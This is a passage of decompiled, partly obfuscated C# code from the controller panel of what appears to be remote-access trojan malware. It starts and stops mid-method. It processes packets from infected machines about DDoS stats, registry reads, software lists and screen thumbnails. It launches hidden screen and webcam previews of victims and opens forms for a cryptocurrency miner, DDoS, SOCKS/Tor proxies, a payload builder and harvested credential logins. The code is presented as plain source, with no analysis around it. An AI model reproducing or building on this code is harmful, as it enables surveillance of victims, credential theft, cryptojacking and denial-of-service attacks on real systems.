																						CClient cclient257 = cclient207;
																						bool flag7 = true;
																						cclient257.SOCKET_DISCONNECT(ref flag7);
																						goto IL_DE40;
																					}
																					cclient207.fDB.method_97();
																				}
																				else if (Operators.CompareString(left3, "speedtest", true) == 0)
																				{
																					cclient207.sBandwidthDL = class6.class152_0.string_0[0];
																				}
																				else if (Operators.CompareString(left3, "speedtest_started", true) == 0)
																				{
																					cclient207.BANDWIDTHDL = "...";
																				}
																				else if (Operators.CompareString(left3, "soft_list", true) == 0)
																				{
																					if (cclient207.fDB == null)
																					{
																						CClient cclient258 = cclient207;
																						bool flag7 = true;
																						cclient258.SOCKET_DISCONNECT(ref flag7);
																						goto IL_DE40;
																					}
																					new Thread(new ThreadStart(class6.class152_0._Lambda$__17)).Start();
																				}
																				else if (Operators.CompareString(left3, "thumb_data", true) == 0)
																				{
																					if (cclient207.fDB == null)
																					{
																						CClient cclient259 = cclient207;
																						bool flag7 = true;
																						cclient259.SOCKET_DISCONNECT(ref flag7);
																						goto IL_DE40;
																					}
																					cclient207.fDB.fThumb_0.method_2();
																					MemoryStream stream9 = new MemoryStream(Convert.FromBase64String(class6.class152_0.string_0[0]));
																					cclient207.fDB.fThumb_0.vmethod_0().Image = Image.FromStream(stream9);
																				}
																				else if (Operators.CompareString(left3, "ddos_stats", true) == 0)
																				{
																					if (Class130.fDDOS_0.Visible)
																					{
																						Class130.fDDOS_0.method_1(cclient207.sKey, class6.class152_0.string_0);
																					}
																				}
																				else if (Operators.CompareString(left3, "ddos_stop", true) == 0)
																				{
																					Class130.fDDOS_0.method_2(cclient207.sKey);
																				}
																				else if (Operators.CompareString(left3, "reg_hkeys_get", true) == 0)
																				{
																					if (cclient207.fDB == null)
																					{
																						CClient cclient260 = cclient207;
																						bool flag7 = true;
																						cclient260.SOCKET_DISCONNECT(ref flag7);
																						goto IL_DE40;
																					}
																					new Thread(new ThreadStart(class6.class152_0._Lambda$__18)).Start();
																				}
																				else if (Operators.CompareString(left3, "reg_keys_get", true) == 0)
																				{
																					if (cclient207.fDB == null)
																					{
																						CClient cclient261 = cclient207;
																						bool flag7 = true;
																						cclient261.SOCKET_DISCONNECT(ref flag7);
																						goto IL_DE40;
																					}
																					new Thread(new ThreadStart(class6.class152_0._Lambda$__19)).Start();
																				}
																				else if (Operators.CompareString(left3, "scr_tb", true) == 0)
																				{
																					if (Class135.smethod_0().UIThumbnails)
																					{
																						MemoryStream stream10 = new MemoryStream(Convert.FromBase64String(class6.class152_0.string_0[0]));
																						cclient207.ICO_STATUS = Image.FromStream(stream10);
																						Class130.imageList_1.Images.Add(cclient207.sKey, cclient207.ICO_STATUS);
																						Class130.fMain_0.method_5(true);
																					}
																				}
																				else if (Operators.CompareString(left3, "dl_dir_obj_count", true) == 0)
																				{
																					Class130.concurrentDictionary_1.TryAdd(class6.class152_0.string_0[0], (int)Math.Round(Conversion.Val(class6.class152_0.string_0[1])));
																				}
																				else if (cclient207.fDB == null)
																				{
																					CClient cclient262 = cclient207;
																					bool flag7 = true;
																					cclient262.SOCKET_DISCONNECT(ref flag7);
																					goto IL_DE40;
																				}
																			}
																		}
																	}
																}
															}
															IL_DDCE:
															fMain ff21 = cclient207.ff;
															CClient cclient263 = cclient207;
															ptr15 = ref cclient263.sKey;
															object value5 = cclient263.sKey;
															ff21.method_24(ref value5);
															ptr15 = Conversions.ToString(value5);
															goto IL_DE40;
														}
														catch (Exception ex96)
														{
															Class130.concurrentDictionary_3[cclient207.sKey].sPacket.Clear();
															goto IL_DE40;
														}
														goto IL_DE1F;
														IL_DE40:
														num170 += unchecked((long)(checked(array14[(int)num147].Length + 1)));
													}
													IL_DE2D:
													num147 += 1L;
													continue;
													IL_DE1F:
													num170 += 1L;
													goto IL_DE2D;
												}
												cclient205.sPacket = new StringBuilder(Strings.Mid(cclient205.sPacket.ToString(), (int)(num170 + 1L)));
											}
										}
										fMain ff22 = cclient205.ff;
										CClient cclient264 = cclient205;
										ref string ptr16 = ref cclient264.sKey;
										object value6 = cclient264.sKey;
										ff22.method_24(ref value6);
										ptr16 = Conversions.ToString(value6);
									}
									catch (Exception ex97)
									{
										cclient205.sPacket.Clear();
										flag8 = false;
										goto IL_DEC7;
									}
									flag8 = true;
									IL_DEC7:
									if (flag8)
									{
										ref double ptr2 = ref Class130.struct20_0.double_2;
										Class130.struct20_0.double_2 = ptr2 + (double)num;
										ptr2 = ref Class130.struct20_0.double_4;
										Class130.struct20_0.double_4 = ptr2 + 1.0;
										CClient cclient265 = cclient2;
										ptr2 = ref cclient265.stats_bytes_in;
										cclient265.stats_bytes_in = ptr2 + (double)num;
									}
								}
							}
						}
					}
					IL_DF07:
					if (cclient2.sock_async.socket_0.Connected)
					{
						return;
					}
				}
			}
			catch (Exception ex98)
			{
			}
			IL_DF2C:
			if (!cclient2.FILE_TRANSFER_ISPAUSED)
			{
				CClient cclient266 = cclient2;
				bool flag3 = true;
				cclient266.SOCKET_DISCONNECT(ref flag3);
			}
		}
	}

	// Token: 0x06001385 RID: 4997 RVA: 0x0000A95C File Offset: 0x00008B5C
	private void method_36()
	{
		this.vmethod_0().method_6();
	}

	// Token: 0x06001386 RID: 4998 RVA: 0x0000A969 File Offset: 0x00008B69
	private void method_37()
	{
		this.vmethod_2().method_6();
	}

	// Token: 0x06001387 RID: 4999 RVA: 0x0009BBC0 File Offset: 0x00099DC0
	private void fMain_SizeChanged(object sender, EventArgs e)
	{
		int num;
		int num4;
		object obj;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_07:
			int num2 = 2;
			if (!(base.WindowState == FormWindowState.Minimized & Class135.smethod_0().SettingsTray))
			{
				goto IL_27;
			}
			IL_1F:
			num2 = 3;
			base.Hide();
			IL_27:
			goto IL_86;
			IL_29:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_47:
			goto IL_7B;
			IL_49:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_59:;
		}
		catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_49;
		}
		IL_7B:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_86:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06001388 RID: 5000 RVA: 0x0009BC6C File Offset: 0x00099E6C
	public void method_38(ref ListView listView_0, ref CClient cclient_1, ref string string_0, ref string string_1, ref string string_2, ref string string_3, ref string string_4, ref string string_5, ref string string_6)
	{
		try
		{
			cclient_1.bJustConnected = false;
			cclient_1.sWindowTitle = Encoding.UTF8.GetString(Convert.FromBase64String(string_0));
			cclient_1.sIdle = string_1;
			cclient_1.sIdleMs = string_2;
			cclient_1.sWebcam = string_3;
			cclient_1.sCPUusage = string_4 + "%";
			cclient_1.lCPUusage = Conversions.ToLong(string_4);
			cclient_1.sBandwidthDL = string_5;
			if (!Class135.smethod_0().UIThumbnails)
			{
				cclient_1.ICO_STATUS = (Image)Interaction.IIf(Conversions.ToDouble(cclient_1.sIdleMs) > 20000.0, Class130.imageList_0.Images["away"], Class130.imageList_0.Images["online"]);
			}
			if (Conversion.Val(string_6) == -1.0)
			{
				cclient_1.ICO_CON = Class130.imageList_0.Images["ethernet"];
			}
			else if (Conversion.Val(string_6) == 0.0)
			{
				cclient_1.ICO_CON = null;
			}
			else if (Conversion.Val(string_6) >= -67.0)
			{
				cclient_1.ICO_CON = Class130.imageList_0.Images["signal5"];
			}
			else if (Conversion.Val(string_6) < -67.0 & Conversion.Val(string_6) >= -70.0)
			{
				cclient_1.ICO_CON = Class130.imageList_0.Images["signal4"];
			}
			else if (Conversion.Val(string_6) < -70.0 & Conversion.Val(string_6) >= -80.0)
			{
				cclient_1.ICO_CON = Class130.imageList_0.Images["signal3"];
			}
			else if (Conversion.Val(string_6) < -80.0 & Conversion.Val(string_6) >= -90.0)
			{
				cclient_1.ICO_CON = Class130.imageList_0.Images["signal2"];
			}
			else if (Conversion.Val(string_6) < -90.0)
			{
				cclient_1.ICO_CON = Class130.imageList_0.Images["signal1"];
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06001389 RID: 5001 RVA: 0x0009BF00 File Offset: 0x0009A100
	public void method_39(ref string string_0)
	{
		if (this.vmethod_4().InvokeRequired)
		{
			this.vmethod_4().Invoke(new fMain.Delegate124(this.method_39), new object[]
			{
				string_0
			});
			return;
		}
		this.vmethod_6().Text = "Status: " + string_0;
	}

	// Token: 0x0600138A RID: 5002 RVA: 0x0009BF58 File Offset: 0x0009A158
	public void method_40(ref ToolStripProgressBar toolStripProgressBar_1, ref long long_0)
	{
		if (toolStripProgressBar_1.ProgressBar.InvokeRequired)
		{
			toolStripProgressBar_1.ProgressBar.Invoke(new fMain.Delegate121(this.method_40), new object[]
			{
				toolStripProgressBar_1,
				long_0
			});
			return;
		}
		toolStripProgressBar_1.Value = checked((int)long_0);
		if (long_0 == 0L)
		{
			this.vmethod_16().Visible = false;
			this.vmethod_14().Margin = new Padding(0, 4, -6, 2);
		}
	}

	// Token: 0x0600138B RID: 5003 RVA: 0x0009BFD4 File Offset: 0x0009A1D4
	public void method_41()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O9R*?9;F", object_);
	}

	// Token: 0x0600138C RID: 5004 RVA: 0x0009C004 File Offset: 0x0009A204
	public void method_42()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O:i*?8l:", object_);
	}

	// Token: 0x0600138D RID: 5005 RVA: 0x0009C034 File Offset: 0x0009A234
	private void method_43(object sender, MouseEventArgs e)
	{
		this.method_95();
		this.vmethod_116().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_18().SelectedObjects.Count > 0, true, false));
		this.vmethod_52().Enabled = Class135.smethod_0().ShowGroups;
		this.vmethod_56().Enabled = Class135.smethod_0().ShowGroups;
		this.vmethod_54().Text = Conversions.ToString(Interaction.IIf(Class135.smethod_0().GroupSubtitles, "Hide", "Show"));
		this.vmethod_104().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_18().SelectedObjects.Count > 0, true, false));
		this.vmethod_160().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_18().SelectedObjects.Count > 0, true, false));
		if (this.vmethod_18().SelectedObjects.Count > 0)
		{
			CClient cclient = (CClient)this.vmethod_18().SelectedObjects[0];
			this.vmethod_132().Enabled = Conversions.ToBoolean(Interaction.IIf(cclient.bPowerOffAllowed, true, false));
			this.vmethod_140().Enabled = Conversions.ToBoolean(Interaction.IIf(cclient.bPowerOffAllowed, true, false));
			this.vmethod_196().Enabled = Conversions.ToBoolean(Interaction.IIf(Operators.CompareString(cclient.sWebcam, "Yes", true) == 0, true, false));
		}
	}

	// Token: 0x0600138E RID: 5006 RVA: 0x0009C1E8 File Offset: 0x0009A3E8
	private void method_44(object sender, CreateGroupsEventArgs e)
	{
		try
		{
			if (Class135.smethod_0().ShowGroups)
			{
				try
				{
					foreach (OLVGroup olvgroup in e.Groups)
					{
						olvgroup.TitleImage = RuntimeHelpers.GetObjectValue(olvgroup.Key);
						if (Class135.smethod_0().GroupSubtitles)
						{
							olvgroup.Subtitle = "Clients: " + Conversions.ToString(olvgroup.VirtualItemCount);
						}
					}
				}
				finally
				{
					IEnumerator<OLVGroup> enumerator;
					if (enumerator != null)
					{
						enumerator.Dispose();
					}
				}
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600138F RID: 5007 RVA: 0x0000A976 File Offset: 0x00008B76
	private void method_45(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_50().Text, "Show", true) == 0)
		{
			Class135.smethod_0().ShowGroups = true;
		}
		else
		{
			Class135.smethod_0().ShowGroups = false;
		}
		this.method_12();
	}

	// Token: 0x06001390 RID: 5008 RVA: 0x0000A9AE File Offset: 0x00008BAE
	private void method_46(object sender, ColumnClickEventArgs e)
	{
		Class135.smethod_0().GroupIndex = e.Column;
		Class135.smethod_0().Save();
	}

	// Token: 0x06001391 RID: 5009 RVA: 0x0000A9CA File Offset: 0x00008BCA
	private void method_47(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_54().Text, "Show", true) == 0)
		{
			Class135.smethod_0().GroupSubtitles = true;
		}
		else
		{
			Class135.smethod_0().GroupSubtitles = false;
		}
		this.method_11();
	}

	// Token: 0x06001392 RID: 5010 RVA: 0x0009C290 File Offset: 0x0009A490
	private void method_48(object sender, EventArgs e)
	{
		try
		{
			if (Operators.CompareString(this.vmethod_56().Text, "Collapse", true) == 0)
			{
				try
				{
					foreach (OLVGroup olvgroup in this.vmethod_18().OLVGroups)
					{
						olvgroup.Collapsed = true;
					}
				}
				finally
				{
					IEnumerator<OLVGroup> enumerator;
					if (enumerator != null)
					{
						enumerator.Dispose();
					}
				}
				this.vmethod_56().Text = "Expand";
			}
			else
			{
				try
				{
					foreach (OLVGroup olvgroup2 in this.vmethod_18().OLVGroups)
					{
						olvgroup2.Collapsed = false;
					}
				}
				finally
				{
					IEnumerator<OLVGroup> enumerator2;
					if (enumerator2 != null)
					{
						enumerator2.Dispose();
					}
				}
				this.vmethod_56().Text = "Collapse";
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06001393 RID: 5011 RVA: 0x0009C378 File Offset: 0x0009A578
	private void method_49(object sender, EventArgs e)
	{
		if (this.vmethod_60().Checked)
		{
			this.vmethod_60().Checked = false;
			Class135.smethod_0().LayoutAutoRefresh = false;
		}
		else
		{
			this.vmethod_60().Checked = true;
			Class135.smethod_0().LayoutAutoRefresh = true;
		}
		Class135.smethod_0().Save();
	}

	// Token: 0x06001394 RID: 5012 RVA: 0x0009C3CC File Offset: 0x0009A5CC
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void method_50()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O8J*?8K/", object_);
	}

	// Token: 0x06001395 RID: 5013 RVA: 0x0009C3FC File Offset: 0x0009A5FC
	private void fMain_Closing(object sender, CancelEventArgs e)
	{
		if (Class130.fSettings_0.TopMost)
		{
			Class130.fSettings_0.TopMost = false;
		}
		if (Class130.fConnectionLog_0.TopMost)
		{
			Class130.fConnectionLog_0.TopMost = false;
		}
		if (Class130.fBuilder_0.TopMost)
		{
			Class130.fBuilder_0.TopMost = false;
		}
		if (Class145.smethod_3().method_2().TopMost)
		{
			Class145.smethod_3().method_2().TopMost = false;
		}
		if (Class130.fUpdate_0.TopMost)
		{
			Class130.fUpdate_0.TopMost = false;
		}
		if (Class130.fPayment_0.TopMost)
		{
			Class130.fPayment_0.TopMost = false;
		}
		if (Class130.fTransferManager_0.TopMost)
		{
			Class130.fTransferManager_0.TopMost = false;
		}
		if (Class130.fMinerXMR_0.TopMost)
		{
			Class130.fMinerXMR_0.TopMost = false;
		}
		if (Class130.fDDOS_0.TopMost)
		{
			Class130.fDDOS_0.TopMost = false;
		}
		if (Class130.fSocks5_0.TopMost)
		{
			Class130.fSocks5_0.TopMost = false;
		}
		if (Class130.fSocks4R_0.TopMost)
		{
			Class130.fSocks4R_0.TopMost = false;
		}
		if (Class130.fTorConfig_0.TopMost)
		{
			Class130.fTorConfig_0.TopMost = false;
		}
		if (Class130.fSplash_0.TopMost)
		{
			Class130.fSplash_0.TopMost = false;
		}
		if (Class130.fMinerXMRLogManager_0.TopMost)
		{
			Class130.fMinerXMRLogManager_0.TopMost = false;
		}
		if (Class130.fCredentialsLogins_0.TopMost)
		{
			Class130.fCredentialsLogins_0.TopMost = false;
		}
		if (MessageBox.Show("Are you sure want to exit?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			this.method_50();
			return;
		}
		e.Cancel = true;
	}

	// Token: 0x06001396 RID: 5014 RVA: 0x0009C590 File Offset: 0x0009A790
	private void method_51(object sender, EventArgs e)
	{
		Class130.fSettings_0.method_0(this);
		Form form = Class145.smethod_3().method_24();
		bool flag = false;
		Form form2 = form;
		Rectangle rectangle;
		if (this != null)
		{
			rectangle = this.RectangleToScreen(this.ClientRectangle);
		}
		else
		{
			rectangle = Screen.FromPoint(form2.Location).WorkingArea;
		}
		checked
		{
			int x = rectangle.Left + (rectangle.Width - form2.Width) / 2;
			int y = rectangle.Top + (rectangle.Height - form2.Height) / 2;
			form2.Location = new Point(x, y);
			if (flag)
			{
				form2.Visible = true;
			}
			Class130.fSettings_0.Visible = true;
			Class130.fSettings_0.Opacity = 100.0;
		}
	}

	// Token: 0x06001397 RID: 5015 RVA: 0x0009C648 File Offset: 0x0009A848
	public void method_52()
	{
		if (Class130.fOnJoin_0.vmethod_8().InvokeRequired)
		{
			Class130.fOnJoin_0.vmethod_8().Invoke(new fMain.Delegate132(this.method_52), new object[0]);
			return;
		}
		checked
		{
			try
			{
				Class130.fOnJoin_0.Visible = true;
				Form fOnJoin_ = Class130.fOnJoin_0;
				bool flag = false;
				Form form = fOnJoin_;
				Rectangle rectangle;
				if (this != null)
				{
					rectangle = this.RectangleToScreen(this.ClientRectangle);
				}
				else
				{
					rectangle = Screen.FromPoint(form.Location).WorkingArea;
				}
				int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
				int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
				form.Location = new Point(x, y);
				if (flag)
				{
					form.Visible = true;
				}
				Class130.fOnJoin_0.Opacity = 100.0;
				Class130.fOnJoin_0.Activate();
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06001398 RID: 5016 RVA: 0x0009C74C File Offset: 0x0009A94C
	private void method_53(object sender, EventArgs e)
	{
		checked
		{
			if (Class130.fMinerXMR_0.vmethod_22().InvokeRequired)
			{
				Class130.fMinerXMR_0.vmethod_22().Invoke(new fMain.Delegate144(this.method_54), new object[0]);
			}
			else
			{
				try
				{
					Class130.fMinerXMR_0.Visible = true;
					Form fMinerXMR_ = Class130.fMinerXMR_0;
					bool flag = false;
					Form form = fMinerXMR_;
					Rectangle rectangle;
					if (this != null)
					{
						rectangle = this.RectangleToScreen(this.ClientRectangle);
					}
					else
					{
						rectangle = Screen.FromPoint(form.Location).WorkingArea;
					}
					int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
					int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
					form.Location = new Point(x, y);
					if (flag)
					{
						form.Visible = true;
					}
					Class130.fMinerXMR_0.Opacity = 100.0;
					Class130.fMinerXMR_0.Activate();
				}
				catch (Exception ex)
				{
				}
			}
		}
	}

	// Token: 0x06001399 RID: 5017 RVA: 0x0009C858 File Offset: 0x0009AA58
	public void method_54()
	{
		if (Class130.fMinerXMR_0.vmethod_22().InvokeRequired)
		{
			Class130.fMinerXMR_0.vmethod_22().Invoke(new fMain.Delegate144(this.method_54), new object[0]);
			return;
		}
		checked
		{
			try
			{
				Class130.fMinerXMR_0.Visible = true;
				Form fMinerXMR_ = Class130.fMinerXMR_0;
				bool flag = false;
				Form form = fMinerXMR_;
				Rectangle rectangle;
				if (this != null)
				{
					rectangle = this.RectangleToScreen(this.ClientRectangle);
				}
				else
				{
					rectangle = Screen.FromPoint(form.Location).WorkingArea;
				}
				int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
				int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
				form.Location = new Point(x, y);
				if (flag)
				{
					form.Visible = true;
				}
				Class130.fMinerXMR_0.Opacity = 100.0;
				Class130.fMinerXMR_0.Activate();
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x0600139A RID: 5018 RVA: 0x0009C95C File Offset: 0x0009AB5C
	public void method_55()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O:V*?:=c", object_);
	}

	// Token: 0x0600139B RID: 5019 RVA: 0x0000AA02 File Offset: 0x00008C02
	private void method_56(object sender, EventArgs e)
	{
		if (Directory.Exists(Application.StartupPath + "\\data\\plugins"))
		{
			Process.Start(Application.StartupPath + "\\data\\plugins");
		}
	}

	// Token: 0x0600139C RID: 5020 RVA: 0x0009C98C File Offset: 0x0009AB8C
	private void method_57(object sender, EventArgs e)
	{
		checked
		{
			if (Class130.fCredentialsLogins_0.InvokeRequired)
			{
				Class130.fCredentialsLogins_0.Invoke(new fMain.Delegate122(this.method_58), new object[0]);
			}
			else
			{
				try
				{
					Class130.fCredentialsLogins_0.Visible = true;
					Form fCredentialsLogins_ = Class130.fCredentialsLogins_0;
					bool flag = false;
					Form form = fCredentialsLogins_;
					Rectangle rectangle;
					if (this != null)
					{
						rectangle = this.RectangleToScreen(this.ClientRectangle);
					}
					else
					{
						rectangle = Screen.FromPoint(form.Location).WorkingArea;
					}
					int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
					int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
					form.Location = new Point(x, y);
					if (flag)
					{
						form.Visible = true;
					}
					Class130.fCredentialsLogins_0.Opacity = 100.0;
					Class130.fCredentialsLogins_0.Activate();
				}
				catch (Exception ex)
				{
					Interaction.MsgBox(ex.Message, MsgBoxStyle.OkOnly, null);
				}
			}
		}
	}

	// Token: 0x0600139D RID: 5021 RVA: 0x0009CAA0 File Offset: 0x0009ACA0
	public void method_58()
	{
		if (Class130.fCredentialsLogins_0.InvokeRequired)
		{
			Class130.fCredentialsLogins_0.Invoke(new fMain.Delegate122(this.method_58), new object[0]);
			return;
		}
		checked
		{
			try
			{
				Class130.fCredentialsLogins_0.Visible = true;
				Form fCredentialsLogins_ = Class130.fCredentialsLogins_0;
				bool flag = false;
				Form form = fCredentialsLogins_;
				Rectangle rectangle;
				if (this != null)
				{
					rectangle = this.RectangleToScreen(this.ClientRectangle);
				}
				else
				{
					rectangle = Screen.FromPoint(form.Location).WorkingArea;
				}
				int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
				int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
				form.Location = new Point(x, y);
				if (flag)
				{
					form.Visible = true;
				}
				Class130.fCredentialsLogins_0.Opacity = 100.0;
				Class130.fCredentialsLogins_0.Activate();
			}
			catch (Exception ex)
			{
				Interaction.MsgBox(ex.Message, MsgBoxStyle.OkOnly, null);
			}
		}
	}

	// Token: 0x0600139E RID: 5022 RVA: 0x0009C98C File Offset: 0x0009AB8C
	private void method_59(object sender, EventArgs e)
	{
		checked
		{
			if (Class130.fCredentialsLogins_0.InvokeRequired)
			{
				Class130.fCredentialsLogins_0.Invoke(new fMain.Delegate122(this.method_58), new object[0]);
			}
			else
			{
				try
				{
					Class130.fCredentialsLogins_0.Visible = true;
					Form fCredentialsLogins_ = Class130.fCredentialsLogins_0;
					bool flag = false;
					Form form = fCredentialsLogins_;
					Rectangle rectangle;
					if (this != null)
					{
						rectangle = this.RectangleToScreen(this.ClientRectangle);
					}
					else
					{
						rectangle = Screen.FromPoint(form.Location).WorkingArea;
					}
					int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
					int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
					form.Location = new Point(x, y);
					if (flag)
					{
						form.Visible = true;
					}
					Class130.fCredentialsLogins_0.Opacity = 100.0;
					Class130.fCredentialsLogins_0.Activate();
				}
				catch (Exception ex)
				{
					Interaction.MsgBox(ex.Message, MsgBoxStyle.OkOnly, null);
				}
			}
		}
	}

	// Token: 0x0600139F RID: 5023 RVA: 0x0000AA2F File Offset: 0x00008C2F
	private void method_60(object sender, EventArgs e)
	{
		this.method_61();
	}

	// Token: 0x060013A0 RID: 5024 RVA: 0x0009CBAC File Offset: 0x0009ADAC
	public void method_61()
	{
		if (Class130.fTransferManager_0.InvokeRequired)
		{
			Class130.fTransferManager_0.Invoke(new fMain.Delegate125(this.method_61), new object[0]);
			return;
		}
		checked
		{
			try
			{
				Class130.fTransferManager_0.Visible = true;
				Form fTransferManager_ = Class130.fTransferManager_0;
				bool flag = false;
				Form form = fTransferManager_;
				Rectangle rectangle;
				if (this != null)
				{
					rectangle = this.RectangleToScreen(this.ClientRectangle);
				}
				else
				{
					rectangle = Screen.FromPoint(form.Location).WorkingArea;
				}
				int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
				int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
				form.Location = new Point(x, y);
				if (flag)
				{
					form.Visible = true;
				}
				Class130.fTransferManager_0.Opacity = 100.0;
				Class130.fTransferManager_0.Activate();
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x060013A1 RID: 5025 RVA: 0x0009CCA8 File Offset: 0x0009AEA8
	private void method_62(object sender, MouseEventArgs e)
	{
		try
		{
			if (Class135.smethod_0().PreviewEnabled)
			{
				if (!(Cursor.Position == this.point_0))
				{
					if (this.vmethod_18().SelectedObjects.Count > 0)
					{
						OLVListItem olvlistItem = (OLVListItem)this.vmethod_18().GetItemAt(e.X, e.Y);
						if (olvlistItem == null)
						{
							this.vmethod_90().Enabled = false;
						}
						else
						{
							this.mouseEventArgs_0 = e;
							this.cclient_0 = (CClient)olvlistItem.RowObject;
							this.vmethod_90().Enabled = false;
							this.vmethod_90().Enabled = true;
						}
					}
					this.point_0 = Cursor.Position;
				}
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060013A2 RID: 5026 RVA: 0x0009CD78 File Offset: 0x0009AF78
	private void method_63(object sender, EventArgs e)
	{
		if (this.vmethod_18().SelectedObjects.Count > 0)
		{
			if ((OLVListItem)this.vmethod_18().GetItemAt(this.mouseEventArgs_0.X, this.mouseEventArgs_0.Y) == null)
			{
				this.vmethod_90().Enabled = false;
				return;
			}
			if (Cursor.Position == this.point_0)
			{
				CClient cclient = (CClient)this.vmethod_18().SelectedObjects[0];
				if (Operators.CompareString(this.cclient_0.sKey, cclient.sKey, true) == 0)
				{
					if (Class135.smethod_0().PreviewSourceScreen & !Class130.concurrentDictionary_3[cclient.sKey].PREVIEW_SCREEN_IS_ENABLED)
					{
						CClient cclient2 = Class130.concurrentDictionary_3[cclient.sKey];
						try
						{
							if (cclient2.fPr == null)
							{
								cclient2.fPr = new fPreview();
								cclient2.fPr.method_3(cclient2.sIP, cclient2.sPort, cclient2.sLANIP, cclient2.sUser, cclient2.sKey);
								cclient2.fPr.Opacity = 0.0;
								cclient2.fPr.Show();
							}
							else if (!cclient2.fPr.Visible)
							{
								cclient2.fPr.method_7();
							}
							cclient2.fPr.method_16();
							string sKey = cclient2.sKey;
							string string_ = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
							{
								"screen_preview_start|",
								cclient2.sKey,
								"|",
								Conversions.ToString(Class135.smethod_0().PreviewUpdateInterval),
								"|",
								Conversions.ToString(Class135.smethod_0().PreviewQuality),
								"|"
							}), Interaction.IIf(cclient2.fPr.bool_0, Class135.smethod_0().PreviewDoubleClickSize, Class135.smethod_0().PreviewDefaultSize)), "|"), cclient2.fPr.Width), "|"), cclient2.fPr.Height));
							string string_2 = sKey;
							Class136.Class138 @class = new Class136.Class138();
							@class.string_0 = string_2;
							@class.string_1 = string_;
							@class.long_0 = 0L;
							try
							{
								if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
								{
									new Thread(new ThreadStart(@class._Lambda$__0)).Start();
								}
							}
							catch (Exception ex)
							{
							}
							cclient2.PREVIEW_SCREEN_IS_ENABLED = true;
						}
						catch (Exception ex2)
						{
						}
					}
					if (Class135.smethod_0().PreviewSourceWebcam & !Class130.concurrentDictionary_3[cclient.sKey].PREVIEW_WEBCAM_IS_ENABLED)
					{
						CClient cclient3 = Class130.concurrentDictionary_3[cclient.sKey];
						try
						{
							if (cclient3.fPr == null)
							{
								cclient3.fPr = new fPreview();
								cclient3.fPr.method_3(cclient3.sIP, cclient3.sPort, cclient3.sLANIP, cclient3.sUser, cclient3.sKey);
								cclient3.fPr.Opacity = 0.0;
								cclient3.fPr.Show();
							}
							else if (!cclient3.fPr.Visible)
							{
								cclient3.fPr.method_7();
							}
							cclient3.fPr.method_16();
							string sKey2 = cclient3.sKey;
							string string_ = string.Concat(new string[]
							{
								"webcam_preview_start|",
								cclient3.sKey,
								"|",
								Conversions.ToString(Class135.smethod_0().PreviewUpdateInterval),
								"|",
								Conversions.ToString(Class135.smethod_0().PreviewQuality)
							});
							string string_2 = sKey2;
							Class136.Class138 @class = new Class136.Class138();
							@class.string_0 = string_2;
							@class.string_1 = string_;
							@class.long_0 = 0L;
							try
							{
								if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
								{
									new Thread(new ThreadStart(@class._Lambda$__0)).Start();
								}
							}
							catch (Exception ex3)
							{
							}
							cclient3.PREVIEW_WEBCAM_IS_ENABLED = true;
						}
						catch (Exception ex4)
						{
						}
					}
					this.vmethod_90().Enabled = false;
					return;
				}
			}
			else
			{
				this.vmethod_90().Enabled = false;
			}
		}
	}

	// Token: 0x060013A3 RID: 5027 RVA: 0x0000AA37 File Offset: 0x00008C37
	private void method_64(object sender, MouseEventArgs e)
	{
		if (Class135.smethod_0().PreviewEnabled)
		{
			this.vmethod_90().Enabled = false;
		}
	}

	// Token: 0x060013A4 RID: 5028 RVA: 0x0009D22C File Offset: 0x0009B42C
	public void method_65()
	{
		if (this.vmethod_18().InvokeRequired)
		{
			this.vmethod_18().Invoke(new fMain.Delegate141(this.method_65), new object[0]);
			return;
		}
		if (this.concurrentStack_0.Count > 0)
		{
			this.vmethod_18().AddObjects(this.concurrentStack_0.ToList<CClient>());
			this.concurrentStack_0.Clear();
			if (!this.struct18_4.method_0())
			{
				this.method_12();
